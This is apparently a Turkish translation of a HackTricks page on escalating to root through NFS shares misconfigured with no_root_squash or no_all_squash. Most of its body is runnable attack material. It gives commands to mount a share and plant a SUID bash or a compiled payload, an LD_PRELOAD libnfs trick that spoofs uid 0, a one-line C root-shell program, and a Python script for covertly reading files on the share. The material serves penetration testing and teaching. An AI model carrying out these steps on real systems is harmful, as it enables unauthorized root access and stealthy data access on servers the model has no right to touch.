<details>

<summary><strong>AWS hackleme becerilerini sıfırdan ileri seviyeye öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>


_ **/etc/exports** _ dosyasını okuyun, eğer **no\_root\_squash** olarak yapılandırılmış bir dizin bulursanız, o dizine **bir istemci olarak erişebilir** ve o dizine yerel **root** gibi **yazabilirsiniz**.

**no\_root\_squash**: Bu seçenek, istemcideki root kullanıcısına NFS sunucusundaki dosyalara root olarak erişim yetkisi verir. Bu ciddi güvenlik sorunlarına yol açabilir.

**no\_all\_squash:** Bu, **no\_root\_squash** seçeneğine benzer, ancak **root olmayan kullanıcılara** uygulanır. Hayal edin, kimliği belirsiz bir kullanıcı olarak bir kabuk elde ettiniz; /etc/exports dosyasını kontrol ettiniz; no\_all\_squash seçeneği mevcut; /etc/passwd dosyasını kontrol ettiniz; root olmayan bir kullanıcıyı taklit ettiniz; (nfs kullanarak bağlanarak) o kullanıcı olarak bir suid dosyası oluşturdunuz. Suid dosyasını kimliği belirsiz bir kullanıcı olarak çalıştırın ve farklı bir kullanıcıya dönüşün.

# Ayrıcalık Yükseltme

## Uzaktan Sömürü

Bu zafiyeti bulduysanız, onu sömürebilirsiniz:

* Bir istemci makinede **o dizini bağlayarak**, **root olarak** içine **/bin/bash** ikili dosyasını kopyalayarak ve ona **SUID** yetkileri vererek, **kurban** makineden o bash ikili dosyasını çalıştırarak.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **İstemci makinesinde** bu dizini bağlamak ve içine **kök olarak kopyalamak** için, SUID izinini kötüye kullanacak derlenmiş payload'ımızı içeren bağlanmış klasöre yerleştirin, SUID haklarını verin ve **kurban makineden** bu ikiliyi çalıştırın (burada bazı [C SUID payloadları](payloads-to-execute.md#c) bulabilirsiniz).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Yerel Sızma

{% hint style="info" %}
Unutmayın, eğer kendi makinenizden hedef makineye bir tünel oluşturabilirseniz, gerekli portları tünelleme yaparak bu ayrıcalık yükseltme işlemini gerçekleştirmek için hala Uzaktan sürümü kullanabilirsiniz.\
Aşağıdaki hile, `/etc/exports` dosyasının bir IP adresini belirttiği durumda kullanılır. Bu durumda her iki durumda da uzaktan sızma kullanamazsınız ve bu hileyi kullanmanız gerekecektir.\
Sızma işleminin çalışması için başka bir gereklilik, `/etc/export` içindeki ihracatın `insecure` bayrağını kullanması gerektiğidir.\
--_/etc/export'ın bir IP adresi belirtip belirtmediğinden emin değilim, bu hile işe yarayacak mı_--
{% endhint %}

## Temel Bilgiler

Senaryo, yerel bir makinede bağlı olan bir NFS paylaşımının sömürülmesini içerir ve istemcinin uid/gid'sini belirtmesine izin veren NFSv3 spesifikasyonundaki bir kusuru kullanır, bu da yetkisiz erişimi mümkün kılar. Sömürü, NFS RPC çağrılarının sahteciliğine izin veren [libnfs](https://github.com/sahlberg/libnfs) adlı bir kütüphanenin kullanılmasını içerir.

### Kütüphanenin Derlenmesi

Kütüphane derleme adımları, çekirdek sürümüne bağlı olarak ayarlamalar gerektirebilir. Bu özel durumda, fallocate sistem çağrıları yorumlandı. Derleme süreci aşağıdaki komutları içerir:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Saldırıyı Gerçekleştirme

Saldırı, ayrıcalıkları root'a yükselten ve ardından bir kabuk çalıştıran basit bir C programı (`pwn.c`) oluşturmayı içerir. Program derlenir ve oluşan ikili (`a.out`), RPC çağrılarında uid'yi sahteleyen `ld_nfs.so` kullanılarak kök paylaşıma yerleştirilir:

1. **Saldırı kodunu derleyin:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Saldırıyı paylaşıma yerleştirin ve uid'yi sahteleyerek izinlerini değiştirin:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Kök ayrıcalıklarını elde etmek için saldırıyı çalıştırın:**
```bash
/mnt/share/a.out
#root
```

## Bonus: Gizli Dosya Erişimi için NFShell
Kök erişimi elde edildikten sonra, iz bırakmamak için sahipliği değiştirmeksizin NFS paylaşımıyla etkileşimde bulunmak için bir Python betiği (nfsh.py) kullanılır. Bu betik, erişilen dosyanın uid'sini ayarlayarak paylaşımdaki dosyalarla izin sorunları olmadan etkileşim sağlar.
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Çalıştırma şekli:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Referanslar
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
